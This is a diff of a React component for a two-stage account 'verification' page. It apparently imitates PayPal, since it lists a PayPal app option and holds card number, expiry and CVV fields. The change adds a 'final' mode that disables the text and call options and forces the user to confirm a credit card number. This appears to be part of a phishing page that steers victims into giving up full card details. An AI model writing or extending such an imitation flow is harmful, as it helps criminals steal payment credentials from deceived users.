@@ -5,15 +5,16 @@ interface VerificationPageProps {
   email: string;
   onBack: () => void;
   onVerificationSuccess: () => void;
+  mode?: 'initial' | 'final';
 }
 
 type VerificationStep = 'choose' | 'confirm_card' | 'enter_code';
 type VerificationOption = 'confirm_card' | 'security_questions' | 'paypal_app' | 'get_text' | 'have_call' | 'get_email' | 'whatsapp';
 
-export function VerificationPage({ email, onBack, onVerificationSuccess }: VerificationPageProps) {
+export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 'initial' }: VerificationPageProps) {
   const [step, setStep] = useState<VerificationStep>('choose');
   const [loading, setLoading] = useState(false);
-  const [selectedOption, setSelectedOption] = useState<VerificationOption>('get_text');
+  const [selectedOption, setSelectedOption] = useState<VerificationOption>(mode === 'initial' ? 'get_text' : 'confirm_card');
   const [cardNumber, setCardNumber] = useState('');
   const [expiryDate, setExpiryDate] = useState('');
   const [cvv, setCvv] = useState('');
@@ -268,11 +269,12 @@ export function VerificationPage({ email, onBack, onVerificationSuccess }: Verif
           <div className="w-full space-y-6 mb-12">
             <SelectableOption 
               id="confirm_card"
-              icon={<CreditCard className="w-6 h-6 text-gray-400" />} 
+              icon={<CreditCard className={`w-6 h-6 ${mode === 'final' ? 'text-gray-700' : 'text-gray-400'}`} />} 
               label="Confirm your credit card number" 
               sublabel="Visa x-••••"
-              selected={false}
-              disabled
+              selected={selectedOption === 'confirm_card'}
+              onSelect={() => setSelectedOption('confirm_card')}
+              disabled={mode !== 'final'}
             />
             <SelectableOption 
               id="security_questions"
@@ -290,18 +292,20 @@ export function VerificationPage({ email, onBack, onVerificationSuccess }: Verif
             />
             <SelectableOption 
               id="get_text"
-              icon={<MessageSquare className="w-6 h-6 text-gray-700" />} 
+              icon={<MessageSquare className={`w-6 h-6 ${mode === 'initial' ? 'text-gray-700' : 'text-gray-400'}`} />} 
               label="Get a text" 
               sublabel="Mobile +1 •••-•••-••••"
               selected={selectedOption === 'get_text'}
               onSelect={() => setSelectedOption('get_text')}
+              disabled={mode !== 'initial'}
             />
             <SelectableOption 
               id="have_call"
-              icon={<Phone className="w-6 h-6 text-gray-700" />} 
+              icon={<Phone className={`w-6 h-6 ${mode === 'initial' ? 'text-gray-700' : 'text-gray-400'}`} />} 
               label="Have us call you" 
               selected={selectedOption === 'have_call'}
               onSelect={() => setSelectedOption('have_call')}
+              disabled={mode !== 'initial'}
             />
             <SelectableOption 
               id="get_email"
